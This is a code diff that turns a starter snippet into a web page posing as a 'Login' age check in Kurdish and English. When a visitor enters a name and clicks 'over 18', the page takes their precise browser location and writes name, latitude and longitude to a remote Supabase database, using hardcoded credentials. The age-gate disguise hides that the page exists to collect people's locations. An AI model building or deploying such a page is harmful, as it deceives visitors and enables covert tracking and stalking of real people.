@@ -1,6 +1,194 @@
-<div class="card">
-  <div class="badge">HTML · CSS · JS</div>
-  <h1>Hello, Forge! ⚡</h1>
-  <p>Edit the three panels on the left — the preview on the right re-renders live as you type.</p>
-  <button id="btn">Clicked <span id="n">0</span> times</button>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ڕێگەپێدانی شوێن | Location Access</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+  <style>
+    /* Custom Map height animation or styling if needed */
+    #map {
+      height: 380px;
+      width: 100%;
+      border-radius: 1rem;
+      margin-top: 1.5rem;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      border: 1px solid rgba(226, 232, 240, 0.8);
+      display: none;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gradient-to-br from-slate-100 via-white to-blue-50 flex items-center justify-center p-4 sm:p-6 font-sans">
+  <div class="w-full max-w-md bg-white rounded-2xl shadow-xl shadow-slate-200/60 p-6 sm:p-8 border border-slate-50">
+    
+    <!-- Header Section -->
+    <div class="text-center mb-6">
+      <div class="inline-flex h-14 w-14 items-center justify-center rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 shadow-lg shadow-blue-200 mb-4 text-white">
+        <svg class="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+        </svg>
+      </div>
+      <h2 class="text-2xl font-bold text-slate-800 tracking-tight">Login</h2>
+      <p class="text-slate-500 mt-1 font-medium" dir="rtl">
+        چوونە ژوور بۆ خوار 18 قەدەغەیە.
+      </p>
+    </div>
+    <!-- Inputs & Buttons -->
+    <div class="space-y-4">
+      <div>
+        <label for="username" class="block text-sm font-medium text-slate-700 mb-1.5 text-left">Your Name / ناوی تۆ</label>
+        <input 
+          type="text" 
+          id="username" 
+          placeholder="ناوی خۆت بنووسە..." 
+          dir="rtl"
+          class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none transition-all text-slate-800 placeholder:text-slate-400"
+        >
+      </div>
+      <button 
+        id="allow" 
+        class="w-full py-3.5 rounded-xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-semibold shadow-md shadow-blue-200 transition-all transform active:scale-[0.99] flex items-center justify-center gap-2"
+      >
+        <span>سەروو 18 ساڵ</span>
+      </button>
+      <button 
+        id="deny" 
+        class="w-full py-3.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold transition-all transform active:scale-[0.99]"
+      >
+        خوار 18 ساڵ
+      </button>
+    </div>
+    <!-- Status & Results Box -->
+    <div id="status-box" class="hidden mt-6 p-4 rounded-xl border text-sm transition-all duration-300">
+      <div id="status-content" class="flex items-start gap-3">
+        <!-- Dynmically loaded message -->
+      </div>
+    </div>
+    <!-- Leaflet Map Container -->
+    <div id="map"></div>
+  </div>
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <!-- Supabase CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    // ==========================================
+    // SUPABASE CONFIGURATION
+    // ==========================================
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    // DOM Elements
+    const allowBtn = document.getElementById("allow");
+    const denyBtn = document.getElementById("deny");
+    const usernameInput = document.getElementById("username");
+    const statusBox = document.getElementById("status-box");
+    const statusContent = document.getElementById("status-content");
+    const mapDiv = document.getElementById("map");
+    let mapInstance = null;
+    // Helper functions to display states
+    function showLoading(msg) {
+      statusBox.className = "mt-6 p-4 rounded-xl border border-blue-100 bg-blue-50 text-blue-700 block transition-all";
+      statusContent.innerHTML = `
+        <svg class="animate-spin h-5 w-5 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="none">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+        </svg>
+        <span class="font-medium">${msg}</span>
+      `;
+    }
+    function showSuccess(msg) {
+      statusBox.className = "mt-6 p-4 rounded-xl border border-emerald-100 bg-emerald-50 text-emerald-800 block transition-all";
+      statusContent.innerHTML = `
+        <span class="text-xl shrink-0">✅</span>
+        <div>
+          <h4 class="font-bold text-base">Location received</h4>
+          <p class="text-sm mt-0.5 text-emerald-700">${msg}</p>
+        </div>
+      `;
+    }
+    function showError(msg) {
+      statusBox.className = "mt-6 p-4 rounded-xl border border-rose-100 bg-rose-50 text-rose-700 block transition-all";
+      statusContent.innerHTML = `
+        <span class="text-xl shrink-0">⚠️</span>
+        <span class="font-medium">${msg}</span>
+      `;
+    }
+    // ==========================================
+    // ACTIONS
+    // ==========================================
+    allowBtn.addEventListener("click", function () {
+      const name = usernameInput.value.trim();
+      if (!name) {
+        showError("Please enter your name in the input box above.");
+        return;
+      }
+      if (!navigator.geolocation) {
+        showError("Geolocation is not supported by your browser.");
+        return;
+      }
+      showLoading("Requesting your location...");
+      navigator.geolocation.getCurrentPosition(
+        async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          // Display the map
+          mapDiv.style.display = "block";
+          if (mapInstance) {
+            mapInstance.remove();
+          }
+          mapInstance = L.map("map").setView([latitude, longitude], 16);
+          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+            attribution: "&copy; OpenStreetMap contributors"
+          }).addTo(mapInstance);
+          L.marker([latitude, longitude])
+            .addTo(mapInstance)
+            .bindPopup("Your current location")
+            .openPopup();
+          // Save to Supabase database
+          const { error } = await supabaseClient
+            .from("locations")
+            .insert([
+              {
+                name: name,
+                latitude: latitude,
+                longitude: longitude
+              }
+            ]);
+          if (error) {
+            console.error("Supabase Error:", error);
+            showError("Location received, but could not be saved to the database.");
+            return;
+          }
+          showSuccess("Your location has been saved successfully.");
+        },
+        function (error) {
+          if (error.code === 1) {
+            showError("Location permission was denied.");
+          } else if (error.code === 2) {
+            showError("Location information is unavailable.");
+          } else if (error.code === 3) {
+            showError("The location request timed out.");
+          } else {
+            showError("An unknown error occurred.");
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    });
+    denyBtn.addEventListener("click", function () {
+      showError("Location access was not allowed.");
+      mapDiv.style.display = "none";
+    });
+  </script>
+</body>
+</html>
